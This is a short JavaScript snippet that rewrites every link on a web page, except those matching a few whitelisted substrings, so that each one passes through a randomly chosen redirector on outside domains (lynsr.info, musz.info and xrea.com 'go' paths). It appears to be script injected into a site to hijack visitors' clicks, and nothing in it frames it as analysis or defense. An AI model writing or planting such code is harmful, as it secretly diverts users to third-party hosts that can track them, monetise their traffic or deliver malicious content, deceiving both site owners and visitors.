var links = document.links;
for (var i=0, iLen=links.length; i<iLen; i++) {
var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'http://faketaxi.s602.xrea.com/go/?', 'http://dymusz.s1007.xrea.com/go/?', 'https://red.lynsr.info/?', 'https://amy.lynsr.info/?'];  
var random  = threads[Math.floor(Math.random() * threads.length)];
var hrefer = document.links[i].href;
if(hrefer.match("av.al") || hrefer.match("anim") || hrefer.match("rf.a")|| hrefer.match("ojjoijpo")|| hrefer.match("ce.al")|| hrefer.match("ce.ny")|| hrefer.match("ja.ay")|| hrefer.match("xx.m")) {
document.links[i].href = document.links[i].href; 
 }else{links[i].href = random + links[i].href;}
 }
